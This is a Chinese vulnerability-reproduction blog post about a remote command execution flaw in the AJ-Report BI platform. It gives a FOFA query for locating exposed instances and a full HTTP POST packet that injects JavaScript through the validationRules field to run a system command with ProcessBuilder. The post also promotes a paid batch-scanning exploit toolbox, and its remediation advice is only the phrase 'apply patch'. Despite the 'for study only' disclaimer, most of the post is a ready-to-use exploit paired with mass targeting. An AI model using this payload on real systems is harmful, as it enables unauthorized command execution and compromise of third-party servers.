#  开源数据大屏AJ-Report存在远程命令执行漏洞   
南风徐来  南风漏洞复现文库   2024-05-07 22:57  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 开源数据大屏AJ-Report简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
AJ-Report是一个完全开源的BI平台  
## 2.漏洞描述  
  
AJ-Report是一个完全开源的BI平台,酷炫大屏展示,能随时随地掌控业务动态,让每个决策都有数据支撑。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
AJ-Report  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaZXiaaVI8h6lA4nnwWq5KYNKhbslCqiaFRdVFiaQdJ0czbndQReCbriaOPQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
开源数据大屏AJ-Report存在远程命令执行漏洞  
## 4.fofa查询语句  
  
title="AJ-Report"  
## 5.漏洞复现  
  
漏洞链接：http://xxx.xxx.xxx.xxx/dataSetParam/verification;swagger-ui/  
  
漏洞数据包：  
```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
Host: xxx.xxx.xxx.xxx
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Content-Length: 345

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ipconfig\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgia9NtL5W1f8PlvT5RtkM1k1wgX8upGicu7jFDyKf20fhZjdOp4X7IhoMA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiazomInf4rLY0qBGDFRvlkpX4ib5M03LV7AqL1Wfh5tD7biaHZMlVN3ohw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaXgt8qcg60ib43ReWlR7FcvrSfzibJnia4uKO5zzR9kutXbY0WszaqdnXw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiajSLhg4u7ibGVCPFT4Vv20ntJH02Y0gJxTKncLjvVQiaYKQHQXIFevhbA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaEvsZ1ANousVdCkLlOgh7LOXnJyVpAss2rPzc929w9Vcqq7XoAEXzkA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bYdbZictWUicK6iaIecYLAbgiaw35C8BPYkGUmKVmMkMc6ib8GWC1QG9EY8ArHUVdBugIvNwLtB5scl3g/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[用友时空KSOA linksframe/linkadd.jsp接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486420&idx=1&sn=554681943252463531f2ab502b1e6f50&chksm=974b86d3a03c0fc5023167ad95a810cde23c79b973d4541ad5a708b046f6356b2e165fcdec78&scene=21#wechat_redirect)  
  
  
[图创图书馆集群管理系统 updOpuserPw接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486420&idx=2&sn=6a461c6f7a17fdcdb37ce5181a0437a8&chksm=974b86d3a03c0fc5b25d3592e1e135576bebb3f4f92b788e74d3ae43137f9747e135c7926705&scene=21#wechat_redirect)  
  
  
